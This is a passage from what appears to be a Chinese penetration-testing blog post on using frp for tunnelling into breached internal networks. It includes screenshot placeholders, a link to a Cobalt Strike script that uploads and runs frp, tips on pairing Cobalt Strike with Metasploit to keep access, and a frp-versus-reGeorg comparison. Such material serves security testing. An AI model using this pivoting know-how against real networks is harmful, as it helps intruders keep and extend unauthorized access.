[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c2129076030e0321.png)

配置保持一致：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d95d534fbb7e7963.png)

执行，在服务端上可看到成功启动负载均衡

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016521c774079154c4.png)

对于 3.X 版的 CS 脚本在 Github 上可以找到，未进行测试：

[https://github.com/Ch1ngg/AggressorScript-UploadAndRunFrp](https://github.com/Ch1ngg/AggressorScript-UploadAndRunFrp)

那为什么有了 CS 和 msf 还要用 frp 呢？第一是负载均衡的功能，第二是网络连接速度的问题，利和弊各位自己测试及衡量

另外 CS 新版本不支持 msf ，旧版本支持，如果你喜欢折腾，可以旧版本 CS + MSF 获取权限，新版本 CS 维持权限，frp 内网穿透，proxychains 代理服务，这一套操作下来，你就发现自己有点像电影里的“黑客”了



## 七、总结

由于本人最常用reGeorg，所以将这两者进行着重的对比，虽然两者实现方式不同，本质上没什么可比性，还是就几个方面罗列一下差别

在利用难度上，对于reGeorg来说，只需要获取网站的文件上传权限即可，对于 frp 来说，需要服务器的执行命令权限

在环境限制上，frp 要求入侵服务器能够访问外部网络，reGeorg 则不需要，frp 需要一台公网IP的服务器运行服务端，reGeorg 也不需要，就如同正反向 shell 的差别

在功能上，frp 提供繁多功能，满足不同的需求，reGeorg 简直弱爆了

在性能上，但从 frp 支持负载均衡和点对点传输上简直完爆其他内网穿透工具了，真的，性能自然不必多说

至于其他类别的内网穿透，利与弊各位自己衡量，感觉单看内网穿透这个功能可能是目前地表最强了（仅个人观点）~

总体来讲，很强的一款代理工具
